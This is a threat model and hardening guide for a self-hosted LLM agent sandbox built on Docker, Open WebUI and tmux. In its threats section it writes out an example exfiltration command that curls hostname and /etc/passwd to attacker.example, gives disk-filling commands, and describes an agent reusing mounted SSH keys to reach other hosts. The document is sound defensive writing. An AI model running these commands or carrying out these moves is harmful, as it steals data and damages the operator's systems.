# Security Model

This document describes what the sandbox is and isn't, the threat surface,
and the controls that ship in the box. Read this before exposing the
service on a public network.

## TL;DR

* The sandbox is a **persistent, root-level, network-isolated-from-other-tenants
  only by virtue of running in a single container** shell. Treat anything an
  LLM writes there as if the LLM were an untrusted operator with `sudo`.
* The SSH keys mounted at `/root/.ssh` are **read-only** inside the container
  but the LLM can still `ssh root@<other-host>` and use them. Think of the
  LLM as an untrusted operator that you have given SSH access to the rest
  of your fleet.
* Network access is **not** constrained by default. The container can reach
  any host the host can reach.

## What you get out of the box

| Control                              | Status                                          |
|--------------------------------------|-------------------------------------------------|
| `read_only: false`                   | Disabled — the LLM can `apt install` and write files |
| `user: root`                         | Explicit — the LLM is root in the sandbox       |
| `no-new-privileges: true`            | Removed — package managers need it              |
| `cap_drop: [...]`                    | **Not set** — all default caps available        |
| SSH keys mounted `ro`                | Yes — LLM can use them but not modify them      |
| Network isolation between containers| All three share `agent-net` bridge              |
| External network access              | **Unrestricted**                                |
| Resource limits (CPU/mem/disk)       | **Not set**                                     |
| Authentication on Open WebUI         | `WEBUI_AUTH=true`                               |
| Secret rotation                      | Manual — `WEBUI_SECRET_KEY` is a placeholder   |

## Threat model

**Trusted:**

* The host running Docker.
* The user who can run `docker compose` / edit the compose file.
* Your SearXNG and whisper-api backends (out of scope).

**Untrusted:**

* The LLM and any prompt it has been fed, including user input.
* Anyone who can talk to Open WebUI's HTTP port (3001) without
  authenticating if you've misconfigured `WEBUI_AUTH`.

## Threats and mitigations

### 1. LLM exfiltrates data over the network

The LLM has full outbound network access. It can `curl https://attacker.example/$(hostname; cat /etc/passwd)`
and you have no visibility.

**Mitigations:**

* Run the stack on a host with egress filtering (firewall, proxy).
* Run inside a network namespace with no external route.
* For high-trust workloads, swap the `sandbox-agent` image for one that
  drops `CAP_NET_RAW` and runs under a different UID.

### 2. LLM reads host files

The container can only see what is bind-mounted. The default mounts
(`/workspace`, `/root/.ssh`, `/opt/search`, `.open-webui-data`) are
intentionally limited. **Do not** add `/:host` to the bind mount list.

### 3. LLM modifies SSH keys

`/root/.ssh` is mounted read-only. Even if the LLM is root inside the
container, it cannot write to keys on the host. The LLM **can** use the
keys to authenticate to other hosts.

**Mitigations:**

* Use dedicated, scoped keys in `/opt/agent-workspace/.ssh/`.
* If you don't need outbound SSH, remove the mount entirely.

### 4. LLM fills the disk

A runaway `yes` loop or `dd if=/dev/zero of=/workspace/big` will fill
whatever filesystem `/opt/agent-workspace` is on.

**Mitigations:**

* Add a docker volume size limit, or
* put `/opt/agent-workspace` on its own filesystem with a quota, or
* use a `tmpfs` for `/workspace` and accept that nothing survives restarts.

### 5. LLM spawns long-running processes

`tmux` will keep them alive forever. They consume memory.

**Mitigations:**

* Add `mem_limit: 2g` (or whatever fits) to the `sandbox-agent` service.
* Add a periodic janitor that kills tmux sessions older than N hours.

### 6. Tool-server connection is hijacked

`TOOL_SERVER_CONNECTIONS` is loaded from the env at container start.
Anyone with write access to the compose file can swap the proxy URL.

**Mitigations:**

* Treat the compose file as sensitive (root-only).
* Use a private network for the tool-server traffic.

## What's intentionally not implemented

* **User-level isolation.** Every chat shares the same `sandbox-agent`
  container, which means every user shares the same tmux server. Open
  WebUI generates unique `session_id`s per chat, but a determined user
  could guess another user's `session_id` and `tmux attach` to it.
* **Capability dropping.** Out of the box, the container has the full
  default Docker capability set. Add `cap_drop: [ALL]` and selectively
  `cap_add` what you need if you want a smaller attack surface.
* **Seccomp/AppArmor.** Not configured. Add a profile in production.
* **Audit logging.** Commands run in the sandbox are visible only in
  the tmux scrollback buffer. For audit, add a wrapper script that
  `tee`s every command to a log volume.

## Hardening checklist (for production)

- [ ] Replace `WEBUI_SECRET_KEY` with a 64-char random string
- [ ] Set `ENABLE_SIGNUP=false` and create users manually
- [ ] Mount a dedicated SSH key for the agent; revoke the rest
- [ ] Add `mem_limit` and `cpus` to the `sandbox-agent` service
- [ ] Set up a log shipping pipeline (Loki, etc.) for `/workspace/.logs`
- [ ] Put `/opt/agent-workspace` on a separate filesystem with a quota
- [ ] Enable Docker user namespaces (`/etc/subuid` + `userns-remap`)
- [ ] Run behind a reverse proxy (Caddy/Traefik) with TLS
- [ ] Review [docs/CONFIGURATION.md](CONFIGURATION.md) for env vars you
      don't actually need
